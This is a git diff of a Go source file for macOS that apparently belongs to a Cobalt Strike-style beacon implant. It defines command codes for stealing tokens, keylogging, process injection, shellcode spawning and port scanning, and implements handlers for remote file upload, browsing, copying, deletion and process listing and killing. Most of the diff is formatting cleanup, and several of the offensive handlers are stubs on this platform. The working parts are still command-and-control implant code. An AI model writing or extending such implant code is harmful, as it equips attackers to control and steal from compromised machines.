@@ -1,4 +1,5 @@
 //go:build darwin
+
 package packet
 
 import (
@@ -6,6 +7,7 @@ import (
 	"encoding/binary"
 	"errors"
 	"fmt"
+	"github.com/shirou/gopsutil/v3/process"
 	"io/ioutil"
 	"main/sysinfo"
 	"main/util"
@@ -14,7 +16,6 @@ import (
 	"path/filepath"
 	"strconv"
 	"strings"
-	"github.com/shirou/gopsutil/v3/process"
 	"syscall"
 )
 
@@ -54,7 +55,6 @@ const (
 	CALLBACK_OUTPUT_UTF8       = 32
 )
 
-
 const (
 	CMD_TYPE_SLEEP        = 4
 	CMD_TYPE_SHELL        = 78
@@ -66,30 +66,29 @@ const (
 	CMD_TYPE_PWD          = 39
 	CMD_TYPE_FILE_BROWSE  = 53
 
-	CMD_TYPE_SPAWN_X64 = 44
-	CMD_TYPE_SPAWN_X86 = 1
-	CMD_TYPE_EXECUTE = 12
-	CMD_TYPE_GETUID = 27
-	CMD_TYPE_STEAL_TOKEN = 31
-	CMD_TYPE_PS = 32
-	CMD_TYPE_KILL = 33
-	CMD_TYPE_DRIVES = 55
-	CMD_TYPE_RUNAS = 38
-	CMD_TYPE_MKDIR = 54
-	CMD_TYPE_RM = 56
-	CMD_TYPE_CP = 73
-	CMD_TYPE_MV = 74
-	CMD_TYPE_REV2SELF = 28
-	CMD_TYPE_MAKE_TOKEN = 49
-	CMD_TYPE_PIPE = 40
-	CMD_TYPE_PORTSCAN_X86 = 89
-	CMD_TYPE_PORTSCAN_X64 = 90
-	CMD_TYPE_KEYLOGGER = 101
+	CMD_TYPE_SPAWN_X64            = 44
+	CMD_TYPE_SPAWN_X86            = 1
+	CMD_TYPE_EXECUTE              = 12
+	CMD_TYPE_GETUID               = 27
+	CMD_TYPE_STEAL_TOKEN          = 31
+	CMD_TYPE_PS                   = 32
+	CMD_TYPE_KILL                 = 33
+	CMD_TYPE_DRIVES               = 55
+	CMD_TYPE_RUNAS                = 38
+	CMD_TYPE_MKDIR                = 54
+	CMD_TYPE_RM                   = 56
+	CMD_TYPE_CP                   = 73
+	CMD_TYPE_MV                   = 74
+	CMD_TYPE_REV2SELF             = 28
+	CMD_TYPE_MAKE_TOKEN           = 49
+	CMD_TYPE_PIPE                 = 40
+	CMD_TYPE_PORTSCAN_X86         = 89
+	CMD_TYPE_PORTSCAN_X64         = 90
+	CMD_TYPE_KEYLOGGER            = 101
 	CMD_TYPE_EXECUTE_ASSEMBLY_X64 = 88
-	CMD_TYPE_IMPORT_POWERSHELL = 37
-	CMD_TYPE_POWERSHELL_PORT =79
-	CMD_TYPE_INJECT_X64 = 43
-
+	CMD_TYPE_IMPORT_POWERSHELL    = 37
+	CMD_TYPE_POWERSHELL_PORT      = 79
+	CMD_TYPE_INJECT_X64           = 43
 )
 
 func ParseCommandShell(b []byte) (string, []byte, error) {
@@ -162,8 +161,7 @@ func Upload(filePath string, fileContent []byte) ([]byte, error) {
 	return []byte("success, the offset is: " + strconv.Itoa(offset)), nil
 }
 
-
-func ChangeCurrentDir(path []byte) ([]byte, error){
+func ChangeCurrentDir(path []byte) ([]byte, error) {
 	err := os.Chdir(string(path))
 	if err != nil {
 		return nil, err
@@ -257,24 +255,24 @@ func File_Browse(b []byte) ([]byte, error) {
 
 }
 
-func Execute(b []byte, Token uintptr) ([]byte, error){
+func Execute(b []byte, Token uintptr) ([]byte, error) {
 	return nil, errors.New("This function is not supported on this platform now.")
 }
 
 func GetUid() ([]byte, error) {
 	result, err := sysinfo.GetUsername()
-	if err != nil{
+	if err != nil {
 		return nil, err
 	}
 	return []byte(result), nil
 }
 
-func Run(b []byte, Token uintptr) ([]byte, error){
+func Run(b []byte, Token uintptr) ([]byte, error) {
 	return nil, errors.New("This function is not supported on this platform now.")
 }
 
-func Mkdir(b []byte) ([]byte, error){
-	if PathExists(string(b)){
+func Mkdir(b []byte) ([]byte, error) {
+	if PathExists(string(b)) {
 		return nil, errors.New("Directory exists")
 	}
 	err := os.Mkdir(string(b), os.ModePerm)
@@ -295,11 +293,11 @@ func PathExists(path string) bool {
 	return false
 }
 
-func Drives() ([]byte, error){
+func Drives() ([]byte, error) {
 	return nil, errors.New("This function is not supported on this platform now.")
 }
 
-func Remove(b[] byte) ([]byte, error){
+func Remove(b []byte) ([]byte, error) {
 	Path := strings.ReplaceAll(string(b), "\\", "/")
 	err := os.RemoveAll(Path)
 	if err != nil {
@@ -308,7 +306,7 @@ func Remove(b[] byte) ([]byte, error){
 	return []byte("Remove " + string(b) + " success"), nil
 }
 
-func Copy(b[] byte) ([]byte, error){
+func Copy(b []byte) ([]byte, error) {
 	buf := bytes.NewBuffer(b)
 	arg, err := util.ParseAnArg(buf)
 	if err != nil {
@@ -319,7 +317,7 @@ func Copy(b[] byte) ([]byte, error){
 	if err != nil {
 		return nil, err
 	}
-	dest :=string(arg)
+	dest := string(arg)
 	bytesRead, err := ioutil.ReadFile(src)
 	if err != nil {
 		return nil, err
@@ -334,10 +332,10 @@ func Copy(b[] byte) ([]byte, error){
 		return nil, err
 	}
 
-	return []byte("Copy " + src + " to "+ dest +" success"), nil
+	return []byte("Copy " + src + " to " + dest + " success"), nil
 }
 
-func Move(b []byte) ([]byte, error){
+func Move(b []byte) ([]byte, error) {
 	buf := bytes.NewBuffer(b)
 	arg, err := util.ParseAnArg(buf)
 	if err != nil {
@@ -348,7 +346,7 @@ func Move(b []byte) ([]byte, error){
 	if err != nil {
 		return nil, err
 	}
-	dest :=string(arg)
+	dest := string(arg)
 	err = os.Rename(src, dest)
 	if err != nil {
 		return nil, err
@@ -365,61 +363,69 @@ func PowershellPort(portByte []byte, b []byte) ([]byte, error) {
 	return nil, errors.New("This function is not supported on this platform now.")
 }
 
-func EncryptHeap() ([]byte, error){
+func EncryptHeap() ([]byte, error) {
 	return nil, errors.New("This function is not supported on this platform now.")
 }
 
-func DoSuspendThreads() ([]byte, error){
+func DoSuspendThreads() ([]byte, error) {
 	return nil, errors.New("This function is not supported on this platform now.")
 }
 
-func DoResumeThreads() ([]byte, error){
+func DoResumeThreads() ([]byte, error) {
 	return nil, errors.New("This function is not supported on this platform now.")
 }
 
-func ExecuteAssembly(shellcode []byte, params []string) ([]byte, error){
+func ExecuteAssembly(shellcode []byte, params []string) ([]byte, error) {
 	return nil, errors.New("This function is not supported on this platform now.")
 }
 
-func InjectProcess(b []byte) ([]byte, error){
+func InjectProcess(b []byte) ([]byte, error) {
 	return nil, errors.New("This function is not supported on this platform now.")
 }
 
-func Spawn_x64(shellcode []byte) ([]byte, error){
+func Spawn_x64(shellcode []byte) ([]byte, error) {
 	return nil, errors.New("This function is not supported on this platform now.")
 }
 
-func HandlerJob(b []byte) ([]byte, error){
+func HandlerJob(b []byte) ([]byte, error) {
 	return nil, errors.New("This function is not supported on this platform now.")
 }
 
-func Steal_token(pid uint32) (uintptr, []byte, error){
+func Steal_token(pid uint32) (uintptr, []byte, error) {
 	return 0, nil, errors.New("This function is not supported on this platform now.")
 }
 
-func Run2self() (bool, error){
+func Run2self() (bool, error) {
 	return false, errors.New("This function is not supported on this platform now.")
 }
 
-func Make_token(b []byte) (uintptr, error){
+func Make_token(b []byte) (uintptr, error) {
 	return 0, errors.New("This function is not supported on this platform now.")
 }
 
-func Spawn_X86(shellcode []byte) ([]byte, error){
+func Spawn_X86(shellcode []byte) ([]byte, error) {
 	return nil, errors.New("This function is not supported on this platform now.")
 }
 
-func Spawn_X64(shellcode []byte) ([]byte, error){
+func Spawn_X64(shellcode []byte) ([]byte, error) {
 	return nil, errors.New("This function is not supported on this platform now.")
 }
 
-func ListProcess() ([]byte, error) {
+func ListProcess(b []byte) ([]byte, error) {
 	/*err := enableSeDebugPrivilege()
 	if err != nil {
 		fmt.Println("SeDebugPrivilege Wrong.")
 	}*/
+	buf := bytes.NewBuffer(b)
+	//resultStr := ""
+	pendingRequest := make([]byte, 4)
+	_, err := buf.Read(pendingRequest)
+	if err != nil {
+		return nil, err
+	}
+
 	processes, err := process.Processes()
-	if err != nil{
+	if err != nil {
 		return nil, err
 	}
 	result := fmt.Sprintf("\n%s\t\t\t%s\t\t\t%s\t\t\t%s\t\t\t%s", "Process Name", "pPid", "pid", "Arch", "User")
@@ -432,7 +438,7 @@ func ListProcess() ([]byte, error) {
 		pPid := parent.Pid
 		name, _ := p.Name()
 		owner, _ := p.Username()
-		//sessionId := sysinfo.GetProcessSessionId(pid)
+		sessionId := sysinfo.GetProcessSessionId(pid)
 		var arc bool
 		var archString string
 		IsX64, err := sysinfo.IsPidX64(uint32(pid))
@@ -445,11 +451,12 @@ func ListProcess() ([]byte, error) {
 			archString = "x86"
 		}
 
-		result += fmt.Sprintf("\n%s\t\t\t%d\t\t\t%d\t\t\t%s\t\t\t%s", name, pPid, pid, archString, owner)
+		result += fmt.Sprintf("\n%s\t%d\t%d\t%s\t%s\t%d", name, pPid, pid, archString, owner, sessionId)
 	}
 
 	//return append(b,[]byte(result)...)
-	return []byte(result), nil
+	//return []byte(result), nil
+	return util.BytesCombine(pendingRequest, []byte(result)), nil
 }
 
 func KillProcess(pid uint32) ([]byte, error) {
@@ -459,11 +466,3 @@ func KillProcess(pid uint32) ([]byte, error) {
 	}
 	return []byte("kill " + strconv.Itoa(int(pid)) + " success"), nil
 }
-
-
-
-
-
-
-
-
